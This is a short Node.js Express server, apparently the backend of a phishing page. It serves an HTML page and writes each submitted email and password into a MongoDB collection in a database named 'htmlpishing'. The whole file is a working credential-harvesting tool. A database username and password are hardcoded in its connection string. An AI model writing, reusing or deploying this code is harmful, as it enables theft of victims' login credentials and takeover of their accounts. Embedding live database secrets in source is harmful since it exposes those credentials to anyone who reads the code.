var express = require('express'); 

    var app = express();  
    var bodyParser = require('body-parser');  
    app.use(bodyParser.json());
   
    mongo=require('mongodb').MongoClient
   dbase=""
   mongo.connect('mongodb://vasistahari:varahagiri143@ds129541.mlab.com:29541/htmlpishing',function(err,database)
   {
   if(err)
   throw err
   else
   {
      console.log("connection established")
      dbase=database.db("htmlpishing")     
   }
   });
    app.get('/', function (req, res) {  
       res.sendFile( __dirname + "/" + "index.html" );  
    })  
   
    app.post('/savedata',function (req, res) {  
       response = {  
           email:req.body.email,  
           password:req.body.password 
       };
      dbase.collection("userdetails").insert(response,function(err,resp)
      {
        if(err)
        throw err
        else
        {
		  
         res.setHeader("content-type","text/plain"); 
          res.end("data inserted successfully");  
        }
      });    
    })

    app.listen(8080);
